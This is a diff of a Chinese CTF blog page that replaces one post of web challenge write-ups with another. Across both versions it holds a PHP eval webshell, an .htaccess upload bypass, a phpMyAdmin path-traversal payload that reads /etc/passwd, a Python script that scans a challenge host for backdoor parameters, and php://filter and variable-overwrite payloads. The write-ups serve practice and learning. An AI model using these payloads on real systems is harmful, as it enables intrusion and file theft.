@@ -29,22 +29,24 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"haorical.xyz","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"changyan","storage":false,"lazyload":false,"nav":{"disqus":{"text":"Load Disqus","order":-1},"gitalk":{"order":-2}},"activeClass":"changyan"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":true,"preload":true}};
   </script>
-<meta name="description" content="[GXYCTF2019]BabyUpload先上传几个正常图片测试，jpeg能用 上传shell过滤了&lt;? &lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;  绕过，上传.htaccess AddType application&#x2F;x-httpd-php .jpeg  把syst">
+<meta name="description" content="[GWCTF 2019]我有一个数据库 phpmyadmin 4.8 cve 文件包含漏洞  ?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd  [RoarCTF 2019]Easy Java学到了请求有get改成post 点击help，发现报错，把get改为post，同时改后面参数，改成post上去 com.wm.ctf.DownloadC">
 <meta property="og:type" content="article">
-<meta property="og:title" content="20211117">
-<meta property="og:url" content="http://haorical.xyz/posts/cc84ab75/index.html">
+<meta property="og:title" content="20211129">
+<meta property="og:url" content="http://haorical.xyz/posts/11d5b1/index.html">
 <meta property="og:site_name" content="中国熊猫的博客">
-<meta property="og:description" content="[GXYCTF2019]BabyUpload先上传几个正常图片测试，jpeg能用 上传shell过滤了&lt;? &lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;  绕过，上传.htaccess AddType application&#x2F;x-httpd-php .jpeg  把syst">
+<meta property="og:description" content="[GWCTF 2019]我有一个数据库 phpmyadmin 4.8 cve 文件包含漏洞  ?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd  [RoarCTF 2019]Easy Java学到了请求有get改成post 点击help，发现报错，把get改为post，同时改后面参数，改成post上去 com.wm.ctf.DownloadC">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-11-17T13:53:13.000Z">
-<meta property="article:modified_time" content="2021-11-18T15:20:40.711Z">
+<meta property="article:published_time" content="2021-11-29T02:56:30.000Z">
+<meta property="article:modified_time" content="2021-11-29T16:27:10.642Z">
 <meta property="article:author" content="Haorical">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="web">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="文件包含">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://haorical.xyz/posts/cc84ab75/">
+<link rel="canonical" href="http://haorical.xyz/posts/11d5b1/">
 
 
 <script class="page-configurations">
@@ -56,7 +58,7 @@
     lang   : 'zh-CN'
   };
 </script>
-<title>20211117 | 中国熊猫的博客</title>
+<title>20211129 | 中国熊猫的博客</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-MH7P85EXS0"></script>
     <script>
@@ -206,7 +208,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-BabyUpload"><span class="nav-number">1.</span> <span class="nav-text">[GXYCTF2019]BabyUpload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="nav-number">2.</span> <span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.</span> <span class="nav-text">[GWCTF 2019]我有一个数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Java"><span class="nav-number">2.</span> <span class="nav-text">[RoarCTF 2019]Easy Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="nav-number">3.</span> <span class="nav-text">[强网杯 2019]高明的黑客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-Mark-loves-cat"><span class="nav-number">4.</span> <span class="nav-text">[BJDCTF2020]Mark loves cat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Had-a-bad-day"><span class="nav-number">5.</span> <span class="nav-text">Had a bad day</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -288,7 +290,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/cc84ab75/">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/11d5b1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -301,7 +303,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          20211117
+          20211129
         </h1>
 
         <div class="post-meta-container">
@@ -312,14 +314,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2021-11-17 21:53:13" itemprop="dateCreated datePublished" datetime="2021-11-17T21:53:13+08:00">2021-11-17</time>
+      <time title="创建时间：2021-11-29 10:56:30" itemprop="dateCreated datePublished" datetime="2021-11-29T10:56:30+08:00">2021-11-29</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-11-18 23:20:40" itemprop="dateModified" datetime="2021-11-18T23:20:40+08:00">2021-11-18</time>
+        <time title="修改时间：2021-11-30 00:27:10" itemprop="dateModified" datetime="2021-11-30T00:27:10+08:00">2021-11-30</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -332,7 +334,7 @@
     </span>
 
   
-    <span id="/posts/cc84ab75/" class="post-meta-item leancloud_visitors" data-flag-title="20211117" title="阅读次数">
+    <span id="/posts/11d5b1/" class="post-meta-item leancloud_visitors" data-flag-title="20211129" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -348,8 +350,8 @@
       <span class="post-meta-item-text">Changyan：</span>
     
     
-      <a title="changyan" href="/posts/cc84ab75/#SOHUCS" itemprop="discussionUrl">
-        <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/cc84ab75/" itemprop="commentCount"></span>
+      <a title="changyan" href="/posts/11d5b1/#SOHUCS" itemprop="discussionUrl">
+        <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/11d5b1/" itemprop="commentCount"></span>
       </a>
     
   </span>
@@ -362,14 +364,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>782</span>
+      <span>3.2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>5 分钟</span>
     </span>
 </div>
 
@@ -380,24 +382,34 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>先上传几个正常图片测试，jpeg能用</p>
-<p>上传shell过滤了&lt;?</p>
-<pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;
+        <h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><blockquote>
+<p>phpmyadmin 4.8 cve 文件包含漏洞</p>
+</blockquote>
+<pre><code>?target=db_sql.php%253f/../../../../../../etc/passwd
 </code></pre>
-<p>绕过，上传.htaccess</p>
-<pre><code>AddType application/x-httpd-php .jpeg
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>学到了请求有get改成post</p>
+<p>点击help，发现报错，把get改为post，同时改后面参数，改成post上去</p>
+<pre><code>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)
 </code></pre>
-<p>把system过滤了</p>
-<p>可以用var_dump打印</p>
-<pre><code>var_dump(scandir(&quot;/&quot;))
-var_dump(file_get_contents(&quot;/flag&quot;));
-</code></pre>
-<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>先githack把git扒下来，有个index.php</p>
-<p>代码审计，过滤的比较多</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#把伪协议读取flag.php给ban了</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#套娃过滤（无参数过滤） 需要构造一个类似这玩意的东西a(b(c(d(e(f())))));</span></span><br><span class="line">           <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#过滤函数关键字</span></span><br></pre></td></tr></table></figure>
+<p>得到一个奇怪的包的目录</p>
+<p>看了下wp，java项目源码在WEB-INF中，构造pyload</p>
+<p>params需要加个filename=WEB-INF/classes/com/wm/ctf/FlagController.class 同时post filename就可以把class下下来</p>
+<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>把源码下下来，一共好几千个文件里面有我们需要的马，我们只需要一个一个试即可🥰</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\haodo\Desktop\20211129\高明黑客\src&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://fab0ef41-82a7-480e-a354-be549de9731f.node4.buuoj.cn:81/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
+<p>需要先本地测试，找到马后直接服务器利用即可</p>
+<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>然后开始构造</p>
-<pre><code>show_source(next(array_reverse(scandir(current(localeconv())))));
+<p>好多payload:</p>
+<pre><code>yds=flag
+is=flag&amp;flag=flag
+</code></pre>
+<h2 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h2><p>php://filter应用</p>
+<p><a target="_blank" rel="noopener" href="https://oatmeal.vip/security/web-learning/php-filter/">https://oatmeal.vip/security/web-learning/php-filter/</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造:</p>
+<pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag
 </code></pre>
 
     </div>
@@ -430,7 +442,7 @@ var_dump(file_get_contents(&quot;/flag&quot;));
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://haorical.xyz/posts/cc84ab75/" title="20211117">http://haorical.xyz/posts/cc84ab75/</a>
+      <a href="http://haorical.xyz/posts/11d5b1/" title="20211129">http://haorical.xyz/posts/11d5b1/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -458,20 +470,19 @@ var_dump(file_get_contents(&quot;/flag&quot;));
           <div class="post-tags">
               <a href="/tags/ctf/" rel="tag"># ctf</a>
               <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/e8e4811b/" rel="prev" title="jwt总结">
-                  <i class="fa fa-chevron-left"></i> jwt总结
+                <a href="/posts/dc361564/" rel="prev" title="sqli-labs速通">
+                  <i class="fa fa-chevron-left"></i> sqli-labs速通
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/5c3bb6e4/" rel="next" title="20211118">
-                  20211118 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
